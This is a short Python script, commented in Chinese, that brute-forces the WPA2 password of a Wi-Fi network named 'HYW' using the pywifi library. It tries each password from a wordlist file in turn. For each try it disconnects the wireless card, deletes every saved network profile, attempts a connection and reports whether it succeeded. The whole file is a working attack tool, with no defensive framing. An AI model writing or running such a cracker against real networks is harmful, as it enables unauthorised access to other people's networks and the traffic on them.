# -*- coding: utf-8 -*-
import pywifi
from pywifi import const
import time


def wifi_net(pass_wd):
    """
    wifi_net
    :param pass_wd:
    :return:
    """
    wifi = pywifi.PyWiFi()
    # 抓取第一个wifi网卡
    i_face = wifi.interfaces()[0]
    # 尝试断开网卡
    i_face.disconnect()
    # 断开需要时间,先设定一秒
    time.sleep(1)
    # 查看是否断开网卡
    if i_face.status() == const.IFACE_DISCONNECTED:
        # 创建wifi链接文件
        profile = pywifi.Profile()
        # 网卡的名称
        profile.ssid = 'HYW'
        # 网卡的开放
        profile.auth = const.AUTH_ALG_OPEN
        # 设置加密类型
        profile.akm.append(const.AKM_TYPE_WPA2PSK)
        # 加密单元
        profile.cipher = const.CIPHER_TYPE_CCMP
        # wifi密码
        profile.key = pass_wd
        # 删除所有的wifi文件
        i_face.remove_all_network_profiles()
        # 设定新的链接文件
        profile_new = i_face.add_network_profile(profile)
        # 链接wifi
        i_face.connect(profile_new)
        # 测试链接需要时间 所有要睡眠
        time.sleep(3)
        # 判断链接状态 默认为4 const.IFACE_CONNECTED=4
        if i_face.status() == const.IFACE_CONNECTED:
            return True
        else:
            return False
    else:
        print('已连接')


def wifi_password():
    wifi_pwd = open('passwd.txt', 'r')
    # 开始破解wifi
    while True:
        filepwd = wifi_pwd.readline()
        filewd = wifi_net(filepwd)
        try:
            if filewd:
                print('密码正确:', filepwd)
                # 结束循环
                break
            else:
                print('密码不正确:', filepwd)
        except:
            # 出现错误就跳出本次循环
            print("=== break ===")
            continue


if __name__ == '__main__':
    wifi_password()
